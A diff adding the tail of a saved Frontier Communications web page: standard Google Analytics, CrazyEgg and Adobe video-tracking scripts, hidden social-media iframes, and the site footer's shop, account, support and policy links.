+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+<!-- End Google Analytics -->
+
+<script type="text/javascript">_satellite.pageBottom();</script><script>
+setTimeout(function(){var a=document.createElement("script");
+var b=document.getElementsByTagName("script")[0];
+a.src=document.location.protocol+"//script.crazyegg.com/pages/scripts/0027/3707.js?"+Math.floor(new Date().getTime()/3600000);
+a.async=true;a.type="text/javascript";b.parentNode.insertBefore(a,b)}, 1);
+
+</script>
+
+</div><!--well-->
+
+          <!-- END CONTENT -->
+
+        </div>
+      </div><!-- main_area -->
+
+      <div id="ftr_footer_area" class="footer_area">
+        <div class="container">
+          <div class="row">
+            <div class="col-md-2 col-sm-2 col-xs-12">
+              <h3>Shop</h3>
+              <ul>
+                <li><a href="https://frontier.com/shop">Plans</a></li>
+                <li><a href="https://frontier.com/shop/internet">Internet</a></li>
+                <li><a href="https://frontier.com/shop/internet/why-fiber-internet">Fiber Internet</a></li>
+                <li><a href="https://frontier.com/shop/tv">Video/TV</a></li>
+                <li><a href="https://frontier.com/shop/phone">Phone</a></li>
+                <li><a href="https://frontier.com/shop/frontier-secure">Frontier Secure</a></li>
+                <li><a href="https://frontier.com/resources/movers">Moving</a></li>
+                <li><a href="https://frontier.com/local">Availability</a></li>
+                <li><a href="https://frontier.com/resources/multifamily" target="blank" rel="nofollow">Multifamily</a></li>
+              </ul>
+            </div>
+            <div class="col-md-2 col-sm-3 col-sm-12 col-xs-12">
+              <h3>My Account</h3>
+              <ul>
+                <li><a href="https://frontier.com/resources/frontier-id-registration?icid=18oct12_national_homepage_register_footer_page_link" target="blank">Register</a></li>
+                <li><a href="https://frontier.com/login" target="blank">Pay Bill</a></li>
+                <li><a href="https://login.frontier.com/webmail" target="blank">Check Email</a></li>
+                <li><a href="https://frontier.com/login" target="blank">Manage Account</a></li>
+                <li><a href="https://frontier.com/resources/myfrontier-mobile-app">MyFrontier App</a></li>
+                <li><a href="https://tv.frontier.com/">Watch TV</a></li>
+              </ul>
+            </div>
+            <div class="col-md-2 col-sm-3 col-xs-12">
+              <h3>Support</h3>
+              <ul>
+                <li><a href="https://frontier.com/helpcenter">Help Center</a></li>
+                <li><a href="http://videos.frontier.com/">Video Gallery</a></li>
+                <li><a href="https://frontier.com/helpcenter/categories/support-wizard">Support Wizard</a></li>
+                <li><a href="https://frontier.com/helpcenter/categories/ticket-status">Trouble Ticket Status</a></li>
+                <li><a href="https://frontier.com/helpcenter/categories/order-status">Order Status</a></li>
+                <li><a href="https://frontier.com/contact-us">Contact Us</a></li>
+              </ul>
+            </div>
+            <div class="col-md-2 col-sm-2 col-xs-12">
+              <h3>Corporate</h3>
+              <ul>
+                <li><a href="https://newsroom.frontier.com/leadership">Company</a></li>
+                <li><a href="http://investor.frontier.com/">Investors</a></li>
+                <li><a href="https://newsroom.frontier.com/">News</a></li>
+                <li><a href="https://blog.frontier.com/">Blog</a></li>
+                <li><a href="https://frontier.com/corporate/responsibility/home">Responsibility</a></li>
+                <li><a href="https://frontier.com/corporate/company/supplier" rel="nofollow">Suppliers</a></li>
+                <li><a href="https://frontier.com/corporate/responsibility/inspection-files/home" rel="nofollow">Public Inspection Files</a></li>
+                <li><a href="https://frontier.com/discount-programs">Discount Programs</a></li>
+                <li><a href="https://frontier-careers.com/">Careers</a></li>
+              </ul>
+            </div>
+            <div class="col-md-2 col-sm-2 col-xs-12">
+              <h3>Frontier Sites</h3>
+              <ul>
+                <li><a href="https://business.frontier.com/" target="blank">Small Business</a></li>
+                <li><a href="https://enterprise.frontier.com/" target="blank">Enterprise</a></li>
+                <li><a href="https://wholesale.frontier.com/home" target="blank" rel="nofollow">Wholesale</a></li>
+                <li><a href="https://frontier.yahoo.com/" target="blank">Frontier Yahoo Portal</a></li>
+                <li><a href="https://frontier.com/frontieragent" target="blank" rel="nofollow">Frontier Business Partner Program</a></li>
+                <li><a href="https://frontier.com/resources/white-pages" target="blank" rel="nofollow">Phone Directories</a></li>
+              </ul>
+            </div>
+            <div class="col-md-2 col-sm-2 col-xs-12">
+              <h3>Sales Partners</h3>
+              <ul>
+                <li><a href="https://internet.frontier.com/" target="blank">Frontier Internet</a></li>
+                <li><a href="https://go.frontier.com/" target="blank">Frontier Fiber</a></li>
+                <li><a href="https://internet.frontier.com/fiber-internet" target="blank">Frontier Fiber Internet</a></li>
+                <li><a href="https://www.frontierbundles.com/availability" target="blank">Local Internet</a></li>
+              </ul>
+            </div>
+            <!--.col-md-12.nopad-->
+          </div>
+          <div class="row">
+            <div class="col-md-2 hidden-sm hidden-xs nopad pull-right">
+              <div class="social-icons-ftr">
+                <span class="fa-stack fa-lg">
+                  <a href="https://twitter.com/FrontierCorp" target="_blank">
+                    <i class="fa fa-circle fa-stack-2x twitter"></i>
+                    <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                  </a>
+                </span>
+                <span class="fa-stack fa-lg">
+                  <a href="https://www.facebook.com/FrontierCorp" target="_blank">
+                    <i class="fa fa-circle fa-stack-2x facebook"></i>
+                    <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+                  </a>
+                </span>
+                <span class="fa-stack fa-lg">
+                  <a href="https://www.linkedin.com/company/frontier-communications" target="_blank">
+                    <i class="fa fa-circle fa-stack-2x linkedin"></i>
+                    <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
+                  </a>
+                </span>
+                <span class="fa-stack fa-lg">
+                  <a href="https://www.youtube.com/user/FrontierCorp" target="_blank">
+                    <i class="fa fa-circle fa-stack-2x youtube"></i>
+                    <i class="fa fa-youtube-play fa-stack-1x fa-inverse">  </i>
+                  </a>
+                </span>
+              </div>
+            </div>
+            <div class="col-md-10 col-sm-12 col-xs-12">
+              <ul id="policies">
+                <li><a href="https://frontier.com/" rel="nofollow">Home</a></li>
+                <li class="spacer">|</li>
+                <li><a href="https://frontier.com/sitemap" rel="nofollow">Site Map</a></li>
+                <li class="spacer">|</li>
+                <li><a href="https://frontier.com/corporate/retailstores/locations" rel="nofollow">Store Locator</a></li>
+                <li class="spacer">|</li>
+                <li><a href="https://frontier.com/corporate/policies" rel="nofollow">Policies &amp; Notifications</a></li>
+                <li class="spacer">|</li>
+                <li><a href="https://frontier.com/corporate/terms" rel="nofollow">Terms &amp; Conditions</a></li>
+                <li class="spacer">|</li>
+                <li><a href="https://frontier.com/corporate/privacy-policy">Privacy Policy</a></li>
+                <li class="spacer">|</li>
+                <li><a href="https://frontier.com/corporate/privacy-policy-california">California Privacy Policy</a></li>
+              </ul>
+              <div id="copyright">©2023 Frontier Communications Parent, Inc. All rights reserved.</div>
+            </div>
+          </div>
+        </div>
+      </div><!-- footer_area -->
+
+    </section>
+
+    <script src="index_files/dtm_bottom.js"></script><script>try { _satellite.pageBottom(); } catch (e) {}</script>
+
+  
+
+<iframe scrolling="no" allowtransparency="true" src="index_files/widget_iframe.html" title="Twitter settings iframe" style="display: none;" frameborder="0"></iframe><script>
+!function(){var e=function(){try{window.s_dtm=window.s_dtm||{},window.s_dtm.videoTracker={video:"",title:"",id:"",duration:"",currentTime:"",isEventViewed:{}};var e=function(e){if(e.classList.contains("vjs-tech")||e.classList.contains("video-js"))return!0;var t=e.parentNode;return t?t.classList.contains("video-js")||t.classList.contains("vjs-tech"):(_satellite.notify("Video did not match a valid player type",3),!1)};document.addEventListener("play",(function(t){if(e(t.target)){var a=s_dtm.videoTracker;a.title!==t.target.getAttribute("data-video-name")&&(a.isEventViewed.play=!1),a.isEventViewed.play||(a.video=t.target,a.title=t.target.getAttribute("data-video-name"),a.id=t.target.getAttribute("data-video-id"),a.duration=t.target.duration,a.currentTime=t.target.currentTime,s_dtm.trackData({events:"event61",prop61:a.title,eVar61:a.title,eVar62:"1:M:0-25",eVar63:"brightcove player"},"tl_o","Video: Start"),a.isEventViewed.play=!0)}}),!0),document.addEventListener("ended",(function(t){if(e(t.target)){var a=Number(t.target.duration),i=Math.floor(a/4);s_dtm.trackData({events:"event65,event66,event67="+i,eVar62:"4:M:75-100"},"tl_o","Video: Completed"),s_dtm.videoTracker.isEventViewed={}}}),!0),document.addEventListener("timeupdate",(function(t){if(e(t.target)){var a=s_dtm.videoTracker.isEventViewed,i=Number(t.target.duration),n=Number(t.target.currentTime),r=Math.floor(n/i*100),d=Math.floor(i/4);25===r?a[25]||(a[25]=!0,s_dtm.trackData({events:"event62,event66,event67="+d,eVar62:"1:M:0-25"},"tl_o","Video: 25% Viewed")):50===r?a[50]||(a[50]=!0,s_dtm.trackData({events:"event63,event66,event67="+d,eVar62:"2:M:25-50"},"tl_o","Video: 50% Viewed")):75===r&&(a[75]||(a[75]=!0,s_dtm.trackData({events:"event64,event66,event67="+d,eVar62:"3:M:50-75"},"tl_o","Video: 75% Viewed")))}}),!0)}catch(e){_satellite.notify("AA - Brightcove Video Tracking error: "+e.message,5)}};"loading"===document.readyState?document.addEventListener("DOMContentLoaded",e):e()}();
+</script><iframe id="rufous-sandbox" scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe><div id="fb-root" class=" fb_reset"><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div></div></div></div></body></html>
